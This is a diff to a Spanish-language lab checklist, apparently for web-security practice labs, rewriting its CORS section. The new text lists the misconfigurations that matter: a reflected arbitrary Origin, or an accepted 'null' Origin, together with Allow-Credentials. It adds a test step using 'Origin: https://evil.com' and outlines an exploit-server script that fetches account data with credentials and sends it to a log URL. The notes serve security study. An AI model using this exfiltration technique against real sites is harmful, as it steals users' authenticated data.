@@ -98,13 +98,17 @@
 - 📁 **Cómo explotar:** [[vulnerabilities/025-dom-based/dom-based|DOM-based]] · sinks: [[vulnerabilities/025-dom-based/sinks|sinks & sources]] · labs: [[vulnerabilities/025-dom-based/labs/README|labs]] · DOM-XSS clásico: [[vulnerabilities/002-xss/README#🌳 DOM XSS — source → sink|XSS→DOM]]
 
 ### Cross-Origin Resource Sharing (CORS)
-> [!danger] 🚩 ¿Está o no está?
-> Refleja **`Origin` arbitrario** en `Access-Control-Allow-Origin` **+
-> `Allow-Credentials: true`** (o acepta `Origin: null`). *A verificar en la respuesta.*
+> [!danger] 🚩 FLAG — se tiene que cumplir esto (en la respuesta del endpoint de datos)
+> **Las dos juntas** para robar datos con sesión:
+> 1. **`Access-Control-Allow-Origin` refleja tu `Origin` arbitrario** (mandás `Origin: https://evil.com` en Repeater y **vuelve reflejado**) — o acepta **`Origin: null`**.
+> 2. **`Access-Control-Allow-Credentials: true`** (necesario: sin esto no exfiltrás nada autenticado).
+>
+> ⚠️ **`Access-Control-Allow-Origin: *` NO cuenta** acá: el `*` es incompatible con `Allow-Credentials: true`, así que no sirve para robar la sesión (solo data pública). Buscás **reflejo** o **`null`**.
 
-- [ ] `fetch` a `/my-account` buscando datos del usuario (`email`, `apiKey`, `password`).
-- [ ] *(extra)* Servir el `fetch` **con credenciales desde el exploit server**: si refleja `Origin` arbitrario + `Allow-Credentials: true` (o `Origin: null`) → exfiltro la respuesta.
-- 📁 [[vulnerabilities/005-cors/cors|CORS]]
+- [ ] En Repeater, a la request que trae los datos (`/accountDetails`, `/my-account`, `/api/...`), agregar `Origin: https://evil.com` → ¿lo refleja? ¿hay `Allow-Credentials: true`?
+- [ ] **Objetivo:** exfiltrar `email`/`apiKey`/`password` → completar la cuenta / avanzar de stage.
+- [ ] **Entrega:** exploit server con un `<script>` que hace `fetch(endpoint,{credentials:'include'})` → `location='/log?key='+…`. **Deliver to victim** y leer el **Access log**.
+- 📁 **Cómo explotar:** [[vulnerabilities/005-cors/cors|CORS]] · labs: [[vulnerabilities/005-cors/labs/README|labs]]
 
 ### HTTP Request Smuggling (HRS)
 > [!danger] 🚩 ¿Está o no está?
